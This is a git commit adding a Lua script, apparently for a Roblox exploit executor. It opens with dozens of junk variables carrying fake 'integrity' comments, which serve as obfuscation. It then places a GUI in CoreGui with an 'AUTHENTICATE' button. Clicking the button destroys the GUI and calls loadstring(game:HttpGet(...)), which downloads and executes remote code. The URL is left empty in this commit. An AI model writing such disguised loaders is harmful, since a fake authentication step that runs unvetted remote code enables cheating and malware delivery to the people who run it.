e451bc8fa624c81a731e2b504ec2b16a750dc35a
nonamemansd <107858894+nonamemansd@users.noreply.github.com>
2026-01-11 22:36:29 +0200

    Push lib_DucWZKgK.lua

---
+++ lib_DucWZKgK.lua
@@ -0,0 +1,48 @@
+
+--[[ ID: dc4ac64002514df48a89a170e7d71828 ]]
+local RDHHp = 963136 + 14; -- // integrity_56245
+local tBMsOiutsqU = 137456 + 52; -- // integrity_43b77
+local fHMeOJLcPCtY = 474428 + 88; -- // integrity_1b34b
+local sJbAIAwC = 872859 + 58; -- // integrity_dd4de
+local tIqogOis = 719681 + 57; -- // integrity_c7d06
+local AMYLfrHFcNf = 954235 + 95; -- // integrity_56954
+local rJbrAOMbObDX = 683929 + 21; -- // integrity_2213f
+local NJBtxnpRZT = 230693 + 21; -- // integrity_c3c8c
+local GaNIi = 222165 + 30; -- // integrity_a7296
+local Kiiat = 807946 + 70; -- // integrity_5f831
+local HxVXLruTo = 397851 + 26; -- // integrity_6494b
+local vreAHNyF = 350418 + 79; -- // integrity_ead82
+local qpPdpY = 43664 + 89; -- // integrity_ace7a
+local RoxNi = 1883 + 23; -- // integrity_ce0b4
+local dfuByVSSqS = 765312 + 84; -- // integrity_38d6b
+local MDhDly = 608039 + 42; -- // integrity_c3588
+local nnahpNI = 339006 + 100; -- // integrity_981ba
+local IImtd = 613677 + 79; -- // integrity_53218
+local VdGTUKeVr = 306378 + 30; -- // integrity_a850b
+local xUrsOQRiZ = 356388 + 78; -- // integrity_6bd94
+local fNRloloNQ = 354473 + 82; -- // integrity_54184
+local LXddgKsoNf = 472018 + 62; -- // integrity_2c740
+local hngeVbRJZy = 146564 + 82; -- // integrity_ba325
+local hnSdcSf = 235818 + 87; -- // integrity_2431d
+local mUnGhKpWn = 357828 + 22; -- // integrity_09a48
+local KATeZUsUsOr = 411078 + 93; -- // integrity_b93e5
+local wHhnNpzHwjFV = 498535 + 40; -- // integrity_98ef3
+local TVtJqbnN = 488005 + 19; -- // integrity_c6999
+
+local MeNmvICgejo = Instance.new("ScreenGui", game:GetService("CoreGui"))
+local HMzKofdPGgo = Instance.new("Frame", MeNmvICgejo)
+HMzKofdPGgo.Size = UDim2.new(0, 320, 0, 190)
+HMzKofdPGgo.Position = UDim2.new(0.5, -160, 0.5, -95)
+HMzKofdPGgo.BackgroundColor3 = Color3.fromRGB(15, 25, 30)
+Instance.new("UICorner", HMzKofdPGgo)
+local JMaQvhbZZFOK = Instance.new("TextButton", HMzKofdPGgo)
+JMaQvhbZZFOK.Size = UDim2.new(0.8, 0, 0, 45)
+JMaQvhbZZFOK.Position = UDim2.new(0.1, 0, 0.6, 0)
+JMaQvhbZZFOK.Text = "AUTHENTICATE"
+JMaQvhbZZFOK.BackgroundColor3 = Color3.fromRGB(254, 241, 123)
+JMaQvhbZZFOK.TextColor3 = Color3.new(1,1,1)
+Instance.new("UICorner", JMaQvhbZZFOK)
+JMaQvhbZZFOK.MouseButton1Click:Connect(function()
+    MeNmvICgejo:Destroy()
+    loadstring(game:HttpGet(""))()
+end)
